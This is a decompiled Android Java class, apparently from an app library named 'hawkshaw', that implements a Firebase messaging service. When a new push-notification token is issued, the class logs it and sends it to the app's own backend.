package com.hawkshaw.library.fcm;

import J1.b;
import W2.y;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import b3.C0298a;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.hawkshaw.library.datalayer.Injector;
import com.hawkshaw.library.datalayer.models.PushFCMTokenRequest;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import j3.f;
import t3.N;

public final class MyFirebaseMessagingService extends FirebaseMessagingService {
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "MyFirebaseMessagingServ";

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    /* access modifiers changed from: private */
    public final Object pushFCMTokenToServer(String str, e eVar) {
        Logger.v$default(Logger.INSTANCE, TAG, C0528x.h("PushFCMTokenToServer: ", str), false, 4, (Object) null);
        Object pushFCMToken = Injector.Companion.getInstance().getAppService().pushFCMToken(new PushFCMTokenRequest(str), eVar);
        return pushFCMToken == C0298a.f4140D ? pushFCMToken : y.f2418a;
    }

    public void onNewToken(String str) {
        K.n(str, "token");
        CoroutineKt.safeLaunch$default(J.a(N.f9292c), (j) null, new b(this, str, (e) null), 1, (Object) null);
    }
}
